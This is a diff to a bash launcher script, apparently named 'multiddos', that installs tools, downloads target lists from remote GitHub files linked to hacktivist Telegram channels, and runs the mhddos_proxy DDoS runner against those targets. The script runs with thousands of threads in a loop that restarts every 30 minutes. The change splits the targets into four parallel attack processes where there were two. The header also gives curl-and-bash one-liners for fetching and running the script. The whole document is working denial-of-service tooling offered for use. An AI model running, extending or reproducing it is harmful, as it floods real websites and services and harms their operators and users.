@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.9.9b\n"
+clear && echo -e "Loading... v0.9.9c\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -38,9 +38,9 @@ if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default
 prepare_targets_and_banner () {
 [ -d /var/tmp/uaripper ] && rm -rf /var/tmp/uaripper/* || mkdir /var/tmp/uaripper/ # clean working folder or create it if it doesn't exist
 
-# DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
+# 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > /var/tmp/uaripper/source1.txt
-# IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
+# 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > /var/tmp/uaripper/source2.txt
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > /var/tmp/uaripper/source3.txt
 
@@ -130,10 +130,14 @@ while true; do
         tail -n 1000 /var/tmp/uaripper/uniq_targets.txt > /var/tmp/uaripper/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
-        cd /var/tmp/uaripper/; split -n l/2 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in 2; cd -
+        cd /var/tmp/uaripper/; split -n l/4 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in several parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xaa.uaripper $methods $threads $args_to_pass &
-        sleep 10 # to decrease load on cpu during simultaneous start
+        sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xab.uaripper $methods $threads $args_to_pass &
+        sleep 5 # to decrease load on cpu during simultaneous start
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xac.uaripper $methods $threads $args_to_pass &
+        sleep 5 # to decrease load on cpu during simultaneous start
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xad.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
 pkill -f start.py; pkill -f runner.py;
